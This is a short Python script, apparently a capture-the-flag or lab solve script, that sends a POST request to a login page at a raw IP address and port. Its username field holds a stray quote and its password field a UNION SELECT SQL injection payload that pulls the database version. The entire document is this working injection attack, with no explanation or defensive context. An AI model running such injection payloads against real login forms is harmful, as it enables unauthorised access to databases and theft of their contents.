import requests

BASE_URL = "http://103.152.242.228:22301/login.php"

headers = {
  "Content-Type": "application/x-www-form-urlencoded"
}

payload = "UNION SELECT ALL 1, 2, 3, version() -- -"

body = {
  "username": "a'",
  "password": payload,
}

s = requests.session()

res = s.post(BASE_URL, data=body)
print(res.text)